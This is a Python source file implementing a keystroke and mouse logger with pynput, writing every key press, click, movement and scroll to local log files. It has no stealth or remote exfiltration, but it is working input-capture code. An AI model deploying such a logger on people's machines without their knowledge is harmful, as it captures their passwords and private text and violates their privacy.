import logging
from pynput import keyboard
from funckje import delete_old_logs


class Logger :
    def __init__(self, log_dir, log_file):
        self.logger = logging.getLogger(log_file)
        self.logger.setLevel(logging.DEBUG)
        handler = logging.FileHandler(log_dir + log_file)
        handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
        self.logger.addHandler(handler)


class KeyLogger(Logger):
    def __init__(self, log_dir):
        super().__init__(log_dir, "key_log.txt")
        self.current_keys = set()
        self.log_dir = log_dir

    def on_press(self, key):
        try:
            self.logger.info(str(key.char))
            if key.char == 'c' and 'ctrl' in self.current_keys:
                self.logger.info("CTRL+C")
            elif key.char == 'v' and 'ctrl' in self.current_keys:
                self.logger.info("CTRL+V")      
        except AttributeError:
            if key == keyboard.Key.space:
                self.logger.info("SPACE")
            elif key == keyboard.Key.enter:
                self.logger.info("ENTER") 
            elif key == keyboard.Key.backspace:
                self.logger.info("BACKSPACE")
            elif key == keyboard.Key.shift:
                self.logger.info("SHFT")
            elif key == keyboard.Key.ctrl:
                self.logger.info("Ctrl")
                self.current_keys.add("ctrl")
            elif key == keyboard.Key.alt:
                self.logger.info("ALT")
            elif key == keyboard.Key.tab:
                self.logger.info("TAB")
            else:
                self.logger.info(str(key))   
            delete_old_logs(self.log_dir + "key_log.txt")                            

    def on_release(self, key):
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.current_keys.discard('ctrl')                        


class MouseLogger(Logger):
    def __init__(self, log_dir):
        super().__init__(log_dir, "mouse_log.txt")

    def on_move(self, x, y):
        self.logger.info("Mouse moved to ({}, {})".format(x, y))

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.logger.info('Mouse clicked at ({}, {}) with {}'.format(x, y, button))

    def on_scroll(self, x, y, dx, dy):
        self.logger.info('Mouse scrolled at ({}, {}), delta=({}, {})'.format(x, y, dx, dy))